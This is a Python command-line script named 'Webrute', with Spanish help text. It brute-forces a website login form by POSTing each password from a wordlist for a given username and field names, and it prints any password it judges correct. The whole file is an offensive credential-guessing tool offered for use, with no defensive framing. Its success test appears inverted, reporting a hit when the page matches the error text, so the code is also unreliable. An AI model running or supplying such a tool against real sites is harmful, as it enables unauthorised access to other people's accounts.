import requests
import random
from bs4 import BeautifulSoup
import argparse
print("""
+-------------------------------------+
|              Webrute                |
|-------------------------------------|
| beta-1.0                            |
| #by : cave02                        |      
| #github : https://github.com/cave02 |
|-------------------------------------|
+-------------------------------------+
""")
parser = argparse.ArgumentParser()
parser.add_argument("-u",help="url o link")
parser.add_argument("-us",help="el usuario")
parser.add_argument("-ut",help="tag usuario")
parser.add_argument("-ct",help="tag contraseña")
parser.add_argument("-d",help="diccionario o lista de contraseñas")
parser.add_argument("-e",help="error al inicion de seccion")
args = parser.parse_args()
def dic(args):
	url = args.u
	username=args.us
	pt = args.ct
	pu = args.ut
	error = args.e
	wordlist = args.d
	def send(username,pt,pu,error,url,wordlist):
		print()
		with open(wordlist,"r") as n:
			for line in n:
				password = line.strip()		
				ez = requests.post(url,data = {
					pu : username,
					pt : password
						})
				lol = BeautifulSoup(ez.content, "html.parser").get_text() 
				print(lol)
				if error != lol :
					print("[INFO] intentando : "+str(password))
				else :
					print()
					print("[+] contraseña : "+str(password))
					break
	send(username,pt,pu,error,url,wordlist)
dic(args)
